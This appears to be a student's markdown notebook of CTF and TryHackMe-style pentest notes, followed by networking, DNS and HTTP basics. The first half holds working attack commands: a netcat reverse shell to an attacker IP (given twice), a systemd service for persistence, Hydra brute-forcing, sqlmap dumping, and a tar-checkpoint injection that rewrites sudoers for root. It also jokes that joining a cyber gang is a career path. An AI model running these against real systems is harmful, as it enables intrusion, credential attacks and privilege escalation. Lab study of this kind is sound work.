# Offensive Security Notes for Educational Purpose Only

## .phtml for Shell
.phtml files are commonly used as PHP web shells for remote code execution. These files can be uploaded to vulnerable servers for exploitation.

## Finding SUID Files (Privileged File Search)
SUID files can be a vector for privilege escalation. This command searches for all files owned by root with the SUID bit set.
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## Reverse Shell Setup

### Creating a Reverse Shell
This command creates a reverse shell that connects back to the attacker's IP (10.8.1.72) on port 1337. It uses netcat to establish the connection.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.72 1337 >/tmp/f" > /tmp/shell.sh
```

### Creating a Service to Execute the Reverse Shell
This sequence creates a systemd service that executes the reverse shell automatically.
```
TF=$(mktemp).service
echo '[Service] Type=oneshot ExecStart=/bin/sh -c "bash /tmp/shell.sh" [Install] WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

## Finding Flags
Searching for potential flag files across the system.
```
dir flag* /s /p
search -f "flag*"
```

## Reverse Image Search
TinyEye (https://www.tineye.com/) can be used for reverse image searches to find where images might be used elsewhere on the web.

## SQL Injection Example
Using sqlmap to perform automated SQL injection attacks and dump the database (if vulnerable).
```
sqlmap -r req.txt --dbms=mysql --dump
```

## Networking Tools

### Check active socket connections and open ports using ss (socket statistics).
```
ss -tulpn
```

## Basic Information Gathering

### Display the current user to check which user you're logged in as.
```
whoami
```

## From MSF Shell to Root (PTY Shell Upgrade)
Use Python to spawn an interactive shell (PTY) for better control and interaction.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## SMBClient Example (Accessing SMB Shares)
Access an anonymous SMB share on a target system to explore its files.
```
smbclient //10.10.233.236/anonymous -N
```

## Hydra for Brute Force Attacks
Use Hydra to brute-force login credentials on a web application using the POST method.
```
hydra -l milesdyson -P log1.txt 10.10.174.36 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```

## Gobuster for Directory Busting
Use Gobuster to search for hidden directories or files on a web server.
```
gobuster dir -u http://10.10.233.236/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
```

## Pentest Monkey Web Shells

Pentest Monkey (https://pentestmonkey.net/) provides a variety of web shells for different web server environments (Apache, IIS, PHP, etc.).
These web shells can be used for further exploration and exploitation once access is gained on a target machine.

### Example: Upload a PHP reverse shell (for educational purposes only)
1. Create a PHP reverse shell (example: php-reverse-shell.php)
2. Upload the shell to a vulnerable server (e.g., via file upload functionality)
3. Once uploaded, access the shell by visiting its URL in the browser

## Privilege Escalation via Cron Jobs
Misconfigurations in cron jobs can provide opportunities for privilege escalation if certain users or processes are allowed to run commands with elevated privileges.
For example, a poorly configured cron job may allow a user with low privileges to execute arbitrary commands as root.

### Example Privilege Escalation via Cron Jobs
Identify cron jobs owned by root or a privileged user and look for potential vulnerabilities (e.g., world-writable files, wrong permissions).
```
crontab -l # List cron jobs for the current user
cat /etc/crontab # View system-wide cron jobs
```

## Privilege Escalation Example (Sudoers Exploit)
The following sequence demonstrates privilege escalation by modifying the sudoers file to grant the 'www-data' user root privileges.
This can be used to escalate from a web user (e.g., www-data) to root on the target system.

### Step 1: Navigate to the web directory
```
cd /var/www/html
```

### Step 2: Create a script that modifies the sudoers file
```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > priv.sh
```

### Step 3: Attempt to execute the script (this step attempts to misuse a checkpoint to trigger execution of the script)
```
echo "/var/www/html" > "--checkpoint-action=exec=sh priv.sh"
echo "/var/www/html" > --checkpoint=1
```

### Step 4: Check sudo permissions to see if we now have escalated privileges
```
sudo -l
```

### Step 5: If the above command shows that we can run commands as root without a password, escalate privileges
```
sudo bash
```

### Step 6: Read the root flag (assuming this is a capture-the-flag type challenge)
```
cat /root/root.txt
```






## Career Paths in Cybersecurity
### Traditional Path
- Learn reverse engineering, malware analysis, and forensics.
- Progression: Forensic Analyst → Researcher → Director → CISO → Security Consultant (Approx. 20 years).

### Alternative Path
- Learn reverse engineering and malware analysis.
- Join a cyber gang, commit a major hack, serve jail time.
- Upon release, become a highly-paid security consultant (Approx. 3 years, or 2 with good behavior).

---

## Common File Locations
- **Tools**: `/root/Desktop/Tools` & `/opt/`
- **Webshells**: `/usr/share/webshells`
- **Wordlists**: `/usr/share/wordlists`
- **READMEs**: `/root/Instructions`
- **Empire & Starkiller Guide**: `/root/Instructions/empire-starkiller.txt`

---

## Offensive Security
### Finding SUID Files
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

### Reverse Shell
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.72 1337 >/tmp/f" > /tmp/shell.sh
```
Create a service to execute it:
```bash
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "bash /tmp/shell.sh"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

### Finding Flags
```bash
dir flag* /s /p
search -f "flag*"
```

---

## PowerShell Basics
### Common Verbs
- Get, Start, Stop, Read, Write, New, Out

### Getting Help
```powershell
Get-Help Command-Name
Get-Help Get-Command -Examples
```

### Listing Commands
```powershell
Get-Command Verb-*
Get-Command *-Noun
```

### Object Manipulation
```powershell
Verb-Noun | Where-Object -Property PropertyName -operator Value
Verb-Noun | Where-Object {$_.PropertyName -operator Value}
```

### File Operations
```powershell
Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-FileHash 'C:\Program Files\interesting-file.txt' -Algorithm MD5
```

### Network Operations
```powershell
Get-NetIPAddress
Get-NetTCPConnection -State Listen -LocalPort 445
```

### Checking Installed Patches
```powershell
Get-HotFix | Measure
```

---

## Incident Response Phases
1. **Preparation**: Train teams, implement preventive measures.
2. **Detection & Analysis**: Monitor and analyze threats.
3. **Containment, Eradication, & Recovery**: Stop spread, remove threats, restore systems.
4. **Post-Incident Activity**: Document lessons learned and improve defenses.

---

## OSI Model (PDN TSPA)
1. **Physical**: Electrical signals, binary transmission.
2. **Data Link**: MAC addressing, NIC identification.
3. **Network**: Routing, optimal path determination.
4. **Transport**: TCP/UDP, reliability, segmentation.
5. **Session**: Connection management.
6. **Presentation**: Data translation, encryption.
7. **Application**: User interfaces, DNS, email, browsing.

### TCP vs. UDP
**TCP**
- Reliable, error-checked.
- Slower, requires continuous connection.

**UDP**
- Faster, stateless.
- No guarantee of data delivery.

---

## Firewalls
- **Stateful**: Tracks full session, high resource usage.
- **Stateless**: Packet-based filtering, lower resource usage.

---

## VPN Technologies
- **PPP**: Authentication, encryption.
- **PPTP**: Basic VPN tunneling, weak encryption.
- **IPSec**: Strong encryption, complex setup.

---

## DNS Records
- **A Record**: IPv4 address.
- **AAAA Record**: IPv6 address.
- **CNAME**: Aliases domain to another domain.
- **MX Record**: Mail server details.
- **TXT Record**: Miscellaneous text-based storage.

### DNS Resolution Process
1. **Local Cache** → 2. **Recursive DNS** → 3. **Root DNS** → 4. **TLD DNS** → 5. **Authoritative DNS**

# DNS Resolution (Noob Version)

1. **Local Cache** 🧠  
   - Your computer checks if it already knows the website’s IP.

2. **Recursive DNS** 🔄  
   - If not, it asks a helper (ISP’s DNS or Google DNS).

3. **Root DNS** 🌍  
   - The helper asks the "internet bosses" where to look next.

4. **TLD DNS** 🏷️  
   - The bosses send it to the right category (like `.com`, `.net`).

5. **Authoritative DNS** 🎯  
   - The final server gives the exact IP, and boom! The website loads.  

---

## TCP Handshake Process
1. SYN (Client → Server)
2. SYN/ACK (Server → Client)
3. ACK (Client → Server)
4. Data Transmission
5. FIN (Closing Connection)

---

## Miscellaneous
- **Router**: Used for port forwarding.
- **Packet**: Contains IP addressing info.
- **Frame**: No IP addressing info.
- **Firewall Types**: Stateful (connection-aware) vs. Stateless (packet-based filtering).

For a complete list of common ports, refer to: [Common Ports List](https://www.vmaxx.net/techinfo/ports.htm)

---

## Useful Commands
### Windows
```powershell
Get-LocalUser # List all users
Get-NetTCPConnection -State Listen -LocalPort 445 # Check active connections
Get-HotFix | Measure # Count installed patches
```

### Linux
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; # Find SUID files
dir flag* /s /p # Search for flags
search -f "flag*" # Alternative flag search
```
# HTTP in Detail

## URL Structure
```
http: scheme ://user:password user @tryhackme.com host/domain:80 port /view? path id=1 query string #task3 fragment
```
- Any port between **1 - 65535** can be used.
- It's possible to make a request to a web server with just one line:
  ```
  GET / HTTP/1.1
  ```

## HTTP Request Example
```
GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/
```

## HTTP Status Codes
### Response Categories:
- **100-199 (Information Response):** Request received; client should continue.
- **200-299 (Success):** Request was successful.
- **300-399 (Redirection):** Request is redirected to another resource.
- **400-499 (Client Errors):** Client made an invalid request.
- **500-599 (Server Errors):** Server encountered an issue processing the request.

### Common HTTP Status Codes
- **200 OK:** Request completed successfully.
- **201 Created:** A new resource was created.
- **301 Moved Permanently:** Resource moved permanently.
- **302 Found:** Temporary redirection.
- **400 Bad Request:** Malformed or missing parameters.
- **401 Unauthorized:** Authentication required.
- **403 Forbidden:** Access denied, even if authenticated.
- **404 Not Found:** Requested resource does not exist.
- **405 Method Not Allowed:** Request method not permitted.
- **500 Internal Server Error:** Unexpected server error.
- **503 Service Unavailable:** Server down or overloaded.

## HTTP Headers
- No headers are strictly required to make an HTTP request, but they are necessary for proper website functionality.

---

# How Websites Work

## Load Balancers
A load balancer distributes incoming requests across multiple servers using algorithms like **round-robin** or **least connections** to optimize performance and reliability.

## CDN (Content Delivery Network)
A **CDN** hosts static files (JavaScript, CSS, images, videos) on globally distributed servers, reducing latency by serving content from the nearest location.

## Databases
Websites use databases to store and retrieve data efficiently. Common databases include:
- **MySQL**
- **PostgreSQL**
- **MongoDB**
- **MSSQL**

Each database has unique features and use cases.

## WAF (Web Application Firewall)
A **WAF** protects web servers by:
- Filtering malicious traffic
- Blocking attacks
- Applying rate limiting to prevent denial-of-service attempts


---





